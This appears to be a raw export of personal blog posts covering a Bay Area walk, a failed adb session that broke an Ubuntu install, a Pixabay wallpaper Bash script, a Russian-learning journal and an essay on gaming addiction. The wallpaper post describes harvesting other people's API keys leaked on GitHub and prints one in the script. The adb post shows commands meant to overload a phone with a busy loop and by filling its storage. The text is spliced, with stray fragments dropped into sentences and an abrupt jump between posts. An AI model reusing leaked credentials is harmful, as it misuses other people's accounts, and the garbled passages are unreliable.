bookshop. I thought about\nhow much I enjoyed libraries like 5 or 6 years ago and became a little\nmelancholy. The library wasn\\'t hot at all.\n\nOrinda does seem affluent, with almost no people. The sun was\nblistering, and I felt very hot. It was like 25 degrees Celcius, and the\nsun makes it impossible for me to go uphill.\n\nThere was a hill up on the left side as I walked along Orinda way, which\nconnects to Berkeley. Then I walked to community park and there were\nsome midaged people with a lot of kids. I walked up to Holden High\nSchool, but there was no people inside.\n\nThen there wasn\\'t anything more to see in Orinda Village. It was much\nsmaller than I had expected. So I took the bus 6. The bus didn\\'t arrive\non time, and I was almost going for Lyft when it arrived. Anyways, I\ntook the bus and went to Moraga.\n\n### Moraga\n\nThere is Miramount high school in Moraga and many students are walking\nout of the high school, so I went in out of curiosity. There was a large\nparking lot and many people were driving. There was a hill at the back\nof the high school, but it was private.\n\n### No place for Walking\n\nSo I exited the school and started walking around Moraga, and I wanted\nto walk to Lafayette Reservoir, but it was just so hard to walk around.\nIt was very hot and there were all those hills and I ran out of water.\nAnyways so I just took the bus 6 again to Lafeyette Bart Station."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb4"}, "title": "Trying adb, Failed, and Recovering My Computer", "date": {"$date": "2023-09-17T15:29:00Z"}, "type": "linux", "access": 1, "body": "## Why?\n\nI want to use Ubuntu Touch os since iphone and android won\\'t let me\naccess the terminal easily and it is not that customizable. The steps\ninclude unlocking the phone bootloader and using ubports to install\nUbuntu Touch.\n\n## adb Didn\\'t Work\n\nSo yesterday is an interesting day.\n\nEverything went the way a normal weekend would go.\n\nThen in the afternoon I was trying the adb on my Ubuntu computer, but it\njust wouldn't work no matter how hard I tried. I tried adb devices and\nadb start-server and adb kill-server but none of them responded, and I\nreinstalled it 3 times, and installed the platform-tools twice but it\nstill wouldn't work. Miraculously it worked on the cloud server.\n\nIt is quite uncommon for an application to have a bug that is hard to\nfix like this, well maybe except for wine or android emulators bugs.\n\nadb wouldn\\'t respond with all of the commands\n\n```sh\nadb devices\nadb start-server\nadb kill-server\n```\n\nAnd I asked ChatGPT how to fix the bug, and it told me various ways like\nusing strace and aux and grep the service, but the just wouldn't work.\nAny commands associated with adb would freeze in the terminal.\n\n## Trying to Debug the Problem\n\nSo I tried the process\n\n```sh\nps aux | grep adb\npkill -f adb\n```\n\nIt did terminate adb but nothing else, adb won\\'t respond.\n\nOnly `adb version`\n\ndid respond, then I tried `rm -rf ~/.android`\n\nThese wouldn\\'t respond when I tried to start the server and debug,\n\n```sh\nadb -L tcp:5037 fork-server server --log debug\nenv -i adb start-server\n```\n\nI mean if there are bugs the bugs should be easily spotted, but in this\ncase it would just freeze in terminal\n\nThen I tried to trace the startup process\n`strace adb start-server`\n\nbut it showed\n\n```sh\nbind(3, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr(\"127.0.0.1\")} 16) = 0\nconnect(3, {sa_family=AF_INET, sin_port=htons(5037), sin_addr=inet_addr(\"127.0.0.1\")} 16) = -1 ECONNREFUSED (Connection refused)\nclose(3) = 0\nsocket(AF_INET6, SOCK_STREAM, IPPROTO_IP) = 3\nbind(3, {sa_family=AF_INET6, sin6_port=htons(0), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, \"::1\", &sin6_addr), sin6_scope_id=0} 28) = 0\nconnect(3, {sa_family=AF_INET6, sin6_port=htons(5037), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, \"::1\", &sin6_addr), sin6_scope_id=0} 28\n```\n\nThen I was really frustrated. Then Chatgpt told me to\n`sudo apt-get purge libudev-dev`\n\nAnd I tried that command, and it broke my computer. Suddenly my computer\ncould no longer boot.\n\n## Remembering the Homework Deadline\n\nThen I remembered I had to do a homework by the end of the day(like 2\nhours work), so I was very anxious indeed, and I went to the school and\ntried work on the windows computer there.\n\nBut the homework wouldn't work in the school's windows computer(without\npython) and gooogle colab, since it constantly complained about modules\nand libraries.\n\nAnd I tried for 2 hours without any success of making the homework run\non the school's computer or the cloud server, and the school\\'s library\nis closing, so I went back home again and tried to fix the computer.\n\n## Emergency Mode\n\nThe computer boots into emergency mode when it starts, and I had no idea\nwhat to do. After trying the root password several times I finally\nmanaged to boot into root, but the systemd was broken, and I entered\nrecovery mode and tried to fsck the system.\n\nA dev service was kind of broken, and Ubuntu couldn\\'t launch.\n\nAnyways, it didn't work well, and I didn't know how to connect to the\ninternet with the computer. So I tried booting from a usb disk, and it\ndidn't went well either. I still couldn't connect to the internet.\n\n## Installing from USB Again\n\nSo I tried to install Ubuntu again from the usb stick. But when booting\nthe old network thing went wrong again. So I tried changing the network\nservice timeout and it worked.\n\n`sudo nano /lib/systemd/system/networkd-wait-online.service`\n\nThen change add timeout to 1 second after the exec command.\n\nThen I could only make Ubuntu connect to internet with ethernet,\nconnecting my phone to the computer with a usb and then by using\n`ip link` to list devices then `sudo dhclient enx\u2026` to connect to that\ndevice, then I could go online, but there was this no additional driver\nfound, and I tried cloning the rt driver and it didn't work. However, it\ncontinuously shows no Wi-Fi adapters found.\n\n## Rubbish Redmi Unlocker\n\nHowever, my redmi phone was locked by the bootloader, so I needed to\nunlock the bootloader to be root. However, I opened the\nhttps://unlock.update.mini.com and it wouldn't download for like 10\ntimes. It is very crappy indeed. Then when I finally get it to download\nit returned a zip with only exe files in it, which is totally terrible\nand inconsiderate for the company.\n\nI tried running the exe with wine but it face so many problems. It\nwouldn\\'t even display. Wine is the most buggy program in Ubuntu.\nYesterday I went to the school and tried running it on the school's\nwindows computer but it couldn't detect the Redmi phone connected.\n\nSo since the bootloader was only in exe I decided it is very crap\nanyways. So I started to hate redmi like I hate windows.\n\n## Phone Ownership\n\nThen I thought about phone ownership and reckoned that if I cannot\naccess the bootloader I do not really own this phone. I cannot customize\nanything, the phone is just basically owned by the company. Don\\'t talk\nabout security and integrity measures, if I cannot do customized\nsettings in this phone I do not own it 100%, and that\\'s not good.\n\n## Trying to Overload the Phone\n\nAnd then I thought since I do not own the phone and the phone is old I\nwant to try overload the phone with adb.\n\nAdb have no root access since the phone is locked, and I tried fastboot\ntoo, it wouldn\\'t load.\n\nThen I tried to play around with the adb shell and tried to overload the\ndevice. I tried a infinite loops.`adb shell \"while true; do :; done &`\nIt instantly made the old phone unusable, but nothing else, and when\nunplugged the phone would still run as good as normal.\n\nThen I tried to load large files into the phone\n`while true; do adb push large_file.txt /sdcard/; done`, but the storage\nsoon filled up and the data part was only accessible by root, and the\nphone was usable after all the mess around.\n\n## No Wifi-Adapters on Ubuntu\n\nThen the Ubuntu Gnome couldn\\'t connect to Wifi, and I couldn\\'t figure\nout the reason. I could only connect to wifi with a phone and usb\ncables.\n\nThen I tried nmcli device wifi list, but it returned\n\n```sh\nIN-USE \u00a0BSSID \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0SSID \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0MODE \u00a0 CHAN \u00a0RATE \u00a0 >\n```\n\nI figured it was because I disabled the network devices earlier on, and\nafter `ls /lib/systemd/system | grep etwork` it returned multiple\nservices,\n\n```sh\nsystemd-networkd.service\nsystemd-networkd-wait-online.service\nNetworkManager.service\nNetworkManager-wait-online.service\n```\n\nthe networkd service causing the\n`A start job is running for wait for network to be configured` problem,\nI might actually accidentally disabled the other.\n\nThen I tried other desktop environments like lxde but lxde wouldn't boot\nand encountered multiple system problems.\n\n## Watching the Russian Figure Skating Test Skate Free Program\n\nAnd then I had tried like 12 hours without success and missed my\nhomework deadline so I was very much in distress. It was 5 am in the\nmorning. So I watched Russian figure skating test skate free program\nlive on <https://1tv.ru> and went to sleep.\n\n## Installing Ubuntu Again\n\nThen I installed the Ubuntu again today, erasing yesterday's partition\nand there was no Wi-Fi adapter problems.\n\nThe steps are\n\n- boot the system (with/without network configurations)\n- connect phone to computer and use dhclient to connect to Internet\n- `sudo apt update && sudo apt install ubuntu-desktop gdm3`\n- `sudo systemctl start gdm3`\n\nThen enable the timeout in \\'systemd-networkd-wait-online.service\\'."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb5"}, "title": "Customize Wallpapers for Gnome", "date": {"$date": "2023-09-14T00:57:00Z"}, "type": "linux", "access": 1, "body": "## Why?\n\nSo the default gnome Ubuntu 22.04 desktop wallpaper is a Jellyfish.\n\nClassic is the best, but I kind of get tired of jellyfish after nearly a\nyear, so I decided to try something on my own.\n\n## Variety\n\nSo variety is an app in gnome software which can change your background.\nThe pictures are good, and you can adjust how long the desktop will\nchange. But it lacks customization, and sometimes I cannot get the\nimages I want.\n\n## Places I wanted to visit\n\nRecently my interests of visiting places shifted exclusively to the\nhigher latitudes. I kind of think that the scenery in the lower\nlatitudes are mediocre. I grew fond of snow and ice, so I listed some\nplaces: \\\"iceland\\\" \\\"saint petersburg\\\" \\\"lofoten\\\" \\\"norway\\\"\n\\\"finland\\\" \\\"siberia\\\" \\\"switzerland\\\".\n\n## Getting an API on pixabay\n\nSo I decided to scrap pixabay for images. When used wget to try to scrap\nit returned 403 forbidden, so I changed the userAgent, but it still\nreturned 403, and I figured it was cloudflare protecting the site.\n\nSo I went to the official API page. I searched on github\n\\\"<https://pixabay.com/api/?key=>\\\" and searched code, getting 2k\nresults. There are many tokens I found that worked. People left their\ntokens in their code, not in env file, which I think is bad practice and\nvery insecure.\n\nBut anyways this is just for fun and not serious.\n\n## Preparations\n\nSet the variables, I decide to keep at most 20 images. When there is\ninternet I will download the images. The service is in systemctl and it\nstarts every 5 mins, so like every 5 mins the wallpaper will change, but\nonly when there is internet connection will the 20 wallpaper images\nchange.\n\nI used bash script because it looks cool. Python kind of works the same.\n\n```sh\n# Variable Definitions\nAPI_KEY=\"560162-704dd2880c027f22c62ab7941\"\nSEARCH_TERMS=(\"iceland\" \"saint petersburg\" \"lofoten\" \"norway\" \"finland\" \"siberia\" \"switzerland\")\nUSER_AGENT=\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0\"\nIMAGE_DIR=\"/home/$USER/Pictures/Wallpapers\"\nMAX_IMAGES=20\nINDEX_FILE=\"$IMAGE_DIR/current_index.txt\"\ncurrent_image_count=$(ls -1 \"$IMAGE_DIR\"/*.jpg 2>/dev/null | wc -l)\n```\n\n## First part: delete the leftover wallpapers\n\nSearch for the oldest image and delete them (delete until there are less\nthan 20 images)\n\n```sh\n# If there are more than MAX_IMAGES, delete images until we reach MAX_IMAGES\nwhile [ \"$current_image_count\" -gt \"$MAX_IMAGES\" ]; do\n    oldest_image=$(ls \"$IMAGE_DIR\"/*.jpg | sort | head -n 1)\n    echo \"Deleting oldest image: $oldest_image\"\n    rm \"$oldest_image\"\n    current_image_count=$(ls -1 \"$IMAGE_DIR\"/*.jpg 2>/dev/null | wc -l)\ndone\n```\n\n## Second part: set the wallpaper\n\nKeep the count in an index file, so I can increase it every time the\nthing runs.\n\n```sh\n# Set the Wallpaper\nif [ ! -f $INDEX_FILE ]; then\n    echo \"1\" >$INDEX_FILE\nfi\ncurrent_index=$(cat $INDEX_FILE)\nsorted_images=($(ls \"$IMAGE_DIR\"/*.jpg | sort))\n```\n\nThen after getting the count then sorting the images we get the\ncorresponding index. After that set the gnome dektop background, then\nincrease the current_index to make it different next time, and store the\ncurrent_index in the index file.\n\n```sh\nif [ ${#sorted_images[@]} -gt 0 ]; then\n    image_index=$((current_index % ${#sorted_images[@]}))\n    next_image=\"${sorted_images[$image_index]}\"\n\n    DBUS_SESSION_BUS_ADDRESS=\"unix:path=/run/user/$(id -u $USER)/bus\"\n    # Set the image as wallpaper using gsettings and set it to 'zoomed' mode\n    gsettings set org.gnome.desktop.background picture-uri \"file://$next_image\"\n    gsettings set org.gnome.desktop.background picture-options 'zoom'\n\n    current_index=$((current_index + 17))\n    echo $current_index >$INDEX_FILE\nelse\n    echo \"No images found in $IMAGE_DIR\"\nfi\n```\n\n## Third part: Download the Wallpaper\n\nCreate folder and then choose a random search term. Add %20 to the\nsearch term to replace the blank space(or it won\\'t work in the pixabay\nAPI)\n\n```sh\nmkdir -p \"$IMAGE_DIR\"\nexec &>>\"$IMAGE_DIR/wallpaper_downloader.log\"\n\n# Choose a random search term\nSEARCH_TERM=${SEARCH_TERMS[$RANDOM % ${#SEARCH_TERMS[@]}]}\nENCODED_SEARCH_TERM=$(printf '%s' \"$SEARCH_TERM\" | sed 's/ /%20/g')\n```\n\nCheck if there\\'s Internet, if there is no internet, then don\\'t do\nanything.\n\n```sh\n# Check for internet connectivity\nwget -q --spider --user-agent=\"$USER_AGENT\" https://google.com\n```\n\nThen if there is internet, we go to pixabay, and fetch the fullhdurl,\nthen download the image, naming it using timestamps.\n\nYou need to specify each entry of the api\n\n```sh\nif [[ $? -eq 0 ]]; then\n    API_INFO_URL=\"https://pixabay.com/api/?key=$API_KEY&q=$ENCODED_SEARCH_TERM&image_type=photo\"\n    totalHits=$(curl -s \"$API_INFO_URL\" -H \"User-Agent: $USER_AGENT\" | jq '.totalHits')\n    numPages=$((totalHits / 20 + 1))\n    if [[ $totalHits -eq 0 ]]; then\n        echo \"No images found for $SEARCH_TERM.\"\n        exit 1\n    fi\n\n    page_number=$((1 + RANDOM % numPages))\n    API_URL=\"$API_INFO_URL&page=$page_number\"\n    image_urls=($(curl -s \"$API_URL\" -H \"User-Agent: $USER_AGENT\" | jq -r '.hits[].fullHDURL'))\n    random_image_url=${image_urls[$RANDOM % ${#image_urls[@]}]}\n\n    if [[ -z \"$random_image_url\" ]]; then\n        echo \"No image URL found.\"\n    else\n        new_file_name=\"$IMAGE_DIR/$(date +%s).jpg\"\n        wget \"$random_image_url\" -O \"$new_file_name\" --user-agent=\"$USER_AGENT\"\n        echo \"Saved image to $new_file_name\"\n    fi\nfi\n```\n\n## Conclusion\n\nRecently I felt kind of frustrated with almost everything, and northern\nEurope seems appealing to me. I don\\'t know what is the meaning of life,\nand I cannot figure out so many things. Everything just became more and\nmore complex.\n\nAnyways, downloading and changing wallpapers is very fun, but I believe\nI will soon change back to the classic JellyFish.\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deb6"}, "title": "The Journey of Language Learning", "date": {"$date": "2023-09-03T00:11:00Z"}, "type": "journal", "access": 1, "body": "## Why learn a new language?\n\nThere's no good reason to learn a new language anyway, like it's not very useful and doesn't give me an instant dopamine rush or happiness. It won't make me more beautiful.\n\n## What led me to study languages\n\nA few years ago I listened to a lot of Soviet songs in Chinese, but they did not arouse any interest in the language itself, since most people sing these songs, but in their Chinese language. There was this \"Soviet culture\" back in the 1950s or 1960s in China, so a lot of old Soviet songs got translated into Chinese.\n\nTo be honest, my interest in Russia has increased only because of figure skating, and I have found that there is a great fascination in watching figure skating starting in 2022, especially Russian figure skating. I watch a lot of videos a day and I'm very interested in the athletes. Age also played a factor, and the skaters tended to be teenagers around my age who had achieved success in their field. After some search and after being a fan of them for a while and learning about their background, my perception changed to one of pure beauty and admiration for their resilience, hard work and recent achievements. In comparison, as a teenager I accomplished literally nothing and spent a huge portion of my life doing meaningless, routine work.\n\n## Don't get involved in politics\n\nDue to the ongoing conflict, I would not say that I am studying Russian to any other people. In fact, this blog is buried deep in my website. \n\nI am a language learner, not trying to or in any ways endorsing political action. It's very subtle here, but again, I'm apolitical. This also does not mean that I am necessarily anti-war or anti-Russian. I simply refuse to state my position. Any opinions of mine on politics is a misunderstanding on the part of another person or purely a coincidence. I neither approve nor disapprove of this geopolitical act because it is complex and beyond my experience and ability to understand.\n\nAnother anecdote ended with the fact that I didn't know about the war when the war started in 2022, I didn't watch the news and just didn't pay attention to it because I was in China. Until Russian figure skating was banned from the World Championships at the end of March, about a month after the war, I realized for the first time that what people were discussing seemed to be something important. At the time, I was studying for TOEFL and did not have anything in mind in the application. Back in 2022, I didn\u2019t even know what NATO is and what will happen to it.\n\n## Additional resources\n\nThe translated language is always not as accurate as reading the original. Learning the language helps me enjoy a variety of information, including Zen, Yandex and VKontakte. It is obviously better to read in original language, especially for a \u201cclosed\u201d country.\n\n## I understand videos better\n\nAnyway, to be honest again, the main reason is that I found a lot of interesting Russian videos (not about politics) and I find it very interesting to understand them without translation or artificial intelligence. It's about how to communicate with people.\n\n## Why I will Keep Learning?\n\nThere must be something that can fill my boring time and entertain me, it is not a reason, rather a coincidence. Instead of mindlessly scrolling through social media, I can mindlessly browse content in a foreign language. No matter how busy I am, I always need time between continuous work to relax.\n\n## Politics is REAL\n\nEven though I shouldn't give my opinion on politics (and you shouldn't take my opinion into account), politics is very real and affects our lives.\n\nFor example, many companies stop to operate in Russia, including\n\n- MongoDB Atlas\n- Grammarly\n- Openai\n\nJudging by the Github repository of the Bromite browser (or Chromium on Android), it had a lot of flais and charged messages. It called the Russian invasion \"genocide\" and called out to \"fight against the Russian regime\", and also contained demands to \"Get rid of Russian software, dependencies and infrastructure \" and \"every Russian is responsible for this war.\" Again, I'm not supposed to have any opinion on this, but I'm simply stating the facts. I think this is going too far and open source software should avoid over-promoting it. After all, there are many Russian open source developers who might be greatly offended by statements like \"every Russian is responsible for this war.\"\n\nRussian skaters were suspended from competition, and the World Championship and GPF medals went to Japan, Korea and the USA. Again, I'm not going to take a position on whether they should be banned or not, but objectively speaking, Russian skaters would likely get gold and silver medals if they competed, with a challenging quadruple jumps and generally good artistic. Most Russian athletes are most likely facing retirement. They lose the opportunity to compete or become world champions, and their promising careers are cut short. In addition, figure skating is just one sport; many other promising athletes are excluded from participation. But I refrain from discussing this issue in detail because it is a very complex issue that is beyond my area of \u200b\u200bexpertise.\n\n## My previous attempts\n\nI tried and then gave up, and now I'm trying again, this time taking a more balanced approach, and I don't see myself giving up anytime soon.\n\nIn early to mid-2023, I listened and learned to sing about 20 Russian songs, having listened to them about 100 times on YouTube, including such popular ones as \u201cKatyusha\u201d, \u201cSmuglyanka\u201d, Molitva, \u201cMoscow Evenings\u201d and \"Kukushka\". Since I am a beginner, these songs are very easy to follow and very popular, I am already familiar with most of the tunes of the songs. I knew absolutely nothing about the lyrics, but I can pick up these sounds if I listen repetively.\n\nI have never studied systematically, this is not my thing and not my job. I appreciate a flexible approach withself-control. After that, I listened to more songs and sometimes watched \u201cRussian 1TV\u201d and other videos on YouTube.\n\nIn February 2024, I coded a Jupyter Notebook that extracted and translated videos and hard-coded some subtitles using ffmpeg, then uploaded the videos to Dropbox and ran it on an RTX GPU in Vast ai. It did work, but was quite buggy and lacked polish, causing bugs frequently.\n\nIn March 2024, I built a video platform with Bootstrap, uploaded a video in Russian, and it automatically translated the subtitles translated from Openai Whisper into English and Chinese using Facebook's NLLB model. I can watch videos with three simultaneous subtitles, and the transcribed version is better than YouTube's default subtitles.\n\nThen in May 2024, I decided to give up learning Russian because I wasn't making much progress. I stopped hosting this platform. I thought that I would find something I liked, but it turned out that I had no other interests.\n\nThen, in June 2024, I decided to try to learn the language again, but maintaining the platform required so much effort, especially due to its intensive machine learning, which often resulted in errors due to insufficient processing power. In addition, the platform was written in Bootstrap and looked ugly, I was tired and didn't want to improve the platform. It served as good experience for full stack development and I knew how to handle authentication, but that was about it. I would still move to other platforms. I also opened an account on HelloTalk (I had opened one before and deleted it the next day).\n\n## Russian software\n\n- Yandex is a leading Russian search engine and technology company providing a wide range of Internet services.\n\n- GigaChat is a chatbot developed by Sberbank, the largest bank in Russia.

I hate to admit it but I was, and I am still\nvery much addicted.\n\n## Facts\n\n- **No Gain and No Worth**: No depth, repetitive, simplistic, devoid of meaningful insights\n- **Extremely Time-consuming**: No play or play 10 hours a day. No middle ground\n\n## Mentally\n\n- **Obsessive**: Mantal drain and brainwash (like malware filling up computer storage)\n- **Toxic Masculin**: The urge to win in games is simply pointless\n- **Escapism**: Lose touch with real challenges and responsibilities\n- **Devoid of Enjoyment**: Lose touch with reality enjoyments\n\n## Physically\n\n- **Lack of self-care**: Leads to eating disorder and sickness\n- **Eye Problems**\n- **Disrupting Schedules**\n\n## Other\n\n- **Disruptive to people around**\n\n## What games am I addicted to?\n\nI consider my preference for gaming strange. I do not like the\nmainstream games like Clash Royale or Honor of Kings which my classmates\nplay. Instead, here is a list of games I remember being addicted to\n(from time order)\n\n- **plants vs zombies** 2nd grade-4th grade\n- **plants vs zombies 2** 4th grade-7th grade, sophomore year\n- **plants vs zombies ol** 3rd grade-8th grade\n- **carrot fantasy**\\\n  3rd grade-7th grade\n- **carrot fantasy 2 (and the variation in 4399)** 3rd grade-7th grade\n- **generals.io** 10th grade-freshman year\n- **zombsroyale.io** sophomore year-now\n- **brawl stars, slither.io** not too addicted\n\n## Measures I have taken to prevent myself from gaming\n\nI have taken multiple measures to prevent myself from gaming, with some\nsuccess and failure.\n\n- Before 6th grade I didn\\'t remember taking any measures myself.\n- In 6th grade I was addicted to plants vs zombies ol, and in the\n  second semester I told myself that every time I play I would write\n  it on a notebook. In the end I controlled it.\n- In 7th grade first semester I was addicted to plants vs zombies 2\n  and carrot fantasy, and I wanted to stop gaming. One day I played\n  carrot fantasy 8 hours. Shortly after, I deleted carrot fantasy.\n  Then I was addicted to plants vs zombies 2, after about a month, I\n  deleted plants vs zombies 2. Then I downloaded plants vs zombies 2\n  and was very much addicted again, then I deleted plants vs zombies 2\n  a second time. Then I started playing plants vs zombies ol, and\n  couldn\\'t stop playing it.doing something in its backend\n- In 8th grade I told myself I must stop gaming. In November I decided\n  gaming is not meaningful. It was painful and in the second semester\n  I remembered trying so hard. I tried to shift my attention to long\n  walks and outdoor activities. In the second semester I played\n  roughly once or twice a week, or once two weeks. In the summer I\n  played less afer shifting my attention completely to outdoor\n  activities.\n- In 9th grade I made an honest effort to stop gaming altogether. I\n  played only once in September 13rd the first semester. In the second\n  semester covid came. I liked going outdoors so much at that time\n  that even during covid I was out walking 2 hours every day. I played\n  less than 5 times the second semester, only before exams when I felt\n  too much pressure.\n- In 10th grade first semester, I wasn\\'t too much into gaming\n  anymore. However, later that semester I suffered great\n  disappointment, since I tried really hard studying(the hardest I\n  ever tried so far as I could remember), but still got a really low\n  score. As a result, I began to feel depression and became easily\n  irritated. In the second semester, I began to play generals.io\n  sometimes, like about twice a week.\n- In Freshman year first semester, all people in my dorm was so\n  addicted to gaming, to the point I felt sick and hated the dorm. I\n  hated school very much but couldn\\'t do anything since I live far\n  from my parents. I played generals.io sometimes, like less than 1\n  hour a day. In the C Programming course I coded generals.io single\n  player in C language myself. I couldn\\'t do anything to stop it, but\n  it wasn\\'t that serious at that time. I distinctly remember in\n  Janurary 1st 2022 I was playing generals.io as the clock turned. In\n  the second semester, however, I grew more frustrated and hated the\n  dorm even more, to the point where I suffered great emotional\n  distress. I tried to control gaming by writing on my notebook before\n  using computer, that \\\"this time I use computer only for \\*\\*\\*\n  purpose, not for gaming\\\". I checked my computer time usage every\n  week. In the end I played for some time but it was under control.\n- In Sophomore year I decided to end it for all. However, everything\n  just got worse. I wrote an essay myself on why gaming is bad,\n  listing all pros and cons. However, it all got worse when I began\n  playing zombsroyale.io. It all started when I accidentally came\n  across the game one afternoon and couldn\\'t stop playing for 2 hours\n  straight. In the first semester there was massive covid lockdowns,\n  and I felt bored and depressed being locked down, and couldn\\'t\n  control myself from playing zombsroyale anymore. In the second\n  semester I got on the exchange program to UC Berkeley. Then things\n  got even worse. In the US, I was very lonely and unmotivated, and I\n  completely lost control of playing zombsroyale. I played for more\n  than 600 hours this year. I did try to stop playing, without any\n  success. In October I stopped gaming for a week straight, motivated\n  to do work when the school was locked down, destroying my\n  motivation. In April I faced a challenging project, and started\n  procrastinating, playing zombsroyale nearly all day long. I ended up\n  cheating in that project. In May I decided to end gaming, and\n  succeeded for a week. However, in June I was caught for the previous\n  cheating, and I got very sad and fully embarrassed of myself,\n  pulling myself back into emotional distress I suffered for long. In\n  early August I felt completely out of motivation and dropped one of\n  the summer classes, playing zombsroyale all day long for a week.\n  Then I decided to stop gaming once and for all, but in the test I\n  got really low scores, making me disappointed once again and lost\n  motivation. Then in late August I tried to stop gaming by disabling\n  zombsroyale /etc/hosts, rewriting the /etc/hosts every few seconds\n  in systemctl service, and dropping the ip address of zombsroyale in\n  iptables. However, the stress I faced with the coming semester was\n  too huge, and I couldn\\'t handle everything. As a result, I flushed\n  the iptable, and manually changed /etc/hosts file and went back to\n  gaming again.\n\n## Why can\\'t I stop gaming?\n\nI did manage to stop gaming a few periods in my life successfully.\nHowever, every time I was pulled back into gaming by emotional distress\ncaused by real life problems. I was pulled back by dopamine release.\n\n## Gaming Itself\n\nAlthough gaming has all the cons, reasons are needed on why gaming is\nbad.\n\nSome invalid reasons include\n\n- The teacher forbids me from gaming.\n- Parents forbid me from gaming. Same as above\n- Gaming shifts your attention from studying.\n  - Everything shifts my\n    attention, including studying foreign languages, planning and taking\n    long walks. Just because gaming shifts my attention doesn\\'t mean I\n    need to quit gaming\n- People who game don\\'t study well\n  - Wrong\n\nSome valid reasons include\n\n- **Time consuming** Gaming is addictive, and I usually spend more\n  time than intended.\n- **Stupidity** Playing games make people INCOMPETENT for doing jobs. Gaming is just toxic and weakens people\n\nI am not saying all gaming is evil; in fact, there are plenty of very good and interesting games that don't have notable disadvantages. \n\nOpenai Gym games are good and interesting to play!\n\nWhat a piece of shitty bloatware does to a computer is exactly what gaming does to one's mind. Bloatware, also known as **crapware**, typically refers to unnecessary software that Also, open source stuff\nthe average user might not need or want, and it can negatively affect a computer's performance in several ways:\n\n- Slows down the system\n- Takes up disk space\n- Increases security risks\n- Complicates the user experience\n- Drains battery life\n\nTo sum it up, such things are mainly **resource-hungry** and **out of control**. They try to eat up your computer systems without notable contributions themselves, and negatively impact the useful stuff. Also, bloatware is usually out of a user's control. It might be backdoors imposed by companies, or monitors that log and send your personal data, or incompatible software forcing a user to use everything that company provides.\n\nGaming does exactly the same to one's mind! It stimulates the mind to be addicted to something useless, and in turn suppresses the mind from processing useful stuff. Also, gaming is usually out of one's control, and when someone is addicted, they practically cannot control themselves at all. Thinking about gaming on a minute basis is awfully easy when one is addicted\u2014it just eats up the mind.\n\nWhen talking about freedom, usually the first thing is about one's freedom of mind\u2014it is as important as freedom in real life. If one's mind is out of control, a person is no different from living in a prison.\n\n## How company exploits you\n\nBy first making you addicted to someone they have exclusivly, then suddenly increasing the price, the company is exploiting the vulnerabilities of personality. The answer to that is never get addicted to something the company earns. In truth the company can raise the money to however high they want, (gradually), and force the user to keep paying to them to play a game(or a feature that only they have). You will lose your life, honestly. If you get addicted it will strongly impact your mind and behavior, forcing you to pay for unnecessary shits and neglect other aspects of your life.\n\nImagine food price skyrocketed, will you still buy them? The answer is yes. For game addicts, gaming is like eating food, and not gaming is like starving(or at least equally painful, or more painful than that). The company then goes to provides \"food\" for the gamer, which is essential to their daily supply.\n\nSuch an act is not only unreasonable but very unethical, however, I see no law enforcements addressing this. So it is very important to be aware of the amount of control the company have on you.\n\n## About the actual \"proprietary\" feature of gaming and lack of control\n\nGaming itself is usually designed to be hard to control since what is the point of gaming if it is easily finished or achieved? Especially those 3D gun games, like people are essentially competing against each other in a virtual world.\n\nThus, there is a lack of `API` in gaming. Things can only be controlled via the frontend GUI. Now, I am not against frontend GUIs, but I don't like certain frontend GUIs. Usually, you can see the amount or level of control the app gives you from the frontend GUI at one glance, to know which apps are easy to control and which ones are buggy. The most popular games seem to me at one glance to be very hard to control in the frontend part, usually requiring an enormous amount of effort over an extended period.\n\nNow, how does gaming make you stay on the page for an extended period? Obviously, by invading one's brain to a toxic level.\n\nModern games typically have complicated (buggy) UIs and lack the transparency seen in open-source software, which means it is exploiting the user. Games should be transparent and be able to run on one's own server. Games should have their source code revealed for users to understand and modify. There are certain proprietary software that is pretty good, but for gaming, since they are unnecessary and aiming to control me, I believe that open source should be a must.\n\nMoreover, they usually charge fees for virtual props, which is completely unreasonable. I can pay for a VPS server or pay for a cloud bucket, which actually provides me with valuable services. But to pay for something virtual that only exists in a certain proprietary shitty game? Hilarious! You don't get anything from your money, and it only needs to change a value in its backend to charge you. Paying in gaming is a great disrespect to money, and shows great irresponsibility.\n\nSay, someone displays a number on an HTML page, and when you give him money, the person increases that number the same as the amount of money you give. Does it seem appealing to pay? No. Of course, modern banks are trusted services, and they are considered secure and preserve your money. But literally, any server changing a number in the backend should charge you nothing at all.\n\nThis is far more unreasonable than VIPs or Premium Subscription (which most I find unreasonable enough). Paid subscription to a service usually means more usage and more bandwidth costs, etc., so that has a point. But gaming, which gives you absolutely nothing more usually with paid features in terms of costs, is just very unreasonable. Moreover, you can run those services like video tubes and stuff on your own server, whether an old laptop or raspberry pi or a cloud VPS, and spend money wisely. However, gaming relies on the external server, meaning being a slave to the master, which is the gaming company.\n\nGaming does provide a chance to engage with people. But I think self-hosting is a better option, and then I can invite people to my own servers, where I make the rules. I am generally fine with centralized gaming servers as long as they make the rules clear, which they don't. So in return, what they give you is completely determined by them. You have nothing, they have everything. They can wipe out the account and do whatever they want easily, you are powerless and can only work limited to the buggy frontend.\n\n## About Setting Limits\n\nBloatwares doesn't stop because you told them to in their shitty frontends. You install a malware and it will always hunger for the resources and try to exploit your system. The same is with gaming. You try to enforce strict restrictions to it systemwide and it complains a million times a day until you remove it.\n\nI set limits to how much time you game a day and my mind doesn't listen. I remind myself to take breaks and I can't. The only way is to tell gaming to f\\*\\*k off.\n\n## Other kinds of shitwares\n\nThere are other kinds of very shitty softwares, that make me very much addicted and is pretty much useless, bloats, that cause all sorts of damage and trouble. It is advised to stay away from them.\n\nExamples include video tubes, crappy social media, etc.\n\n## Why Open Source is the solution?\n\nOpen source is the solution because it has the source code, granting one control. A person can compile and read the source code, and as a result, the code doesn't dominate the user.\n\nThe companies refuse to release the source code for games. This is nonsense. All games shall be open source, and give user the freedom to modify! I want to modify parts of a game myself or tune it, and there is no way but to comply with the company behind it! The company hosts the gaming in its own servers, and who knows if it is secure??? The lack of transparency 